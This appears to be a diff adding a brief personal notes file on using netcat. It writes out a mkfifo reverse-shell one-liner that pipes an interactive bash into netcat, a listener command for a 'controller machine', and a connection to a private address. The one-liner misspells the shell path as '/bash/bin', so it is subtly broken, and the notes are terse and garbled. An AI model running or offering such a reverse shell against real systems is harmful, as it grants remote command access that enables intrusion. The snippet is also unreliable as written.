@@ -1,0 +1,14 @@
+netcat -l 1234 => on the controller machine
+
+rm /tmp/f ; mkfifo /tmp/f; cat /tmp/f | /bash/bin -i 2>&1 | netcat localhost 1234 > /tmp/f
+
+The above is used in local machine's
+
+To access a remote server
+=========================
+
+netcat -l 1234
+
+netcat 192.168.1.7 1234
+
+
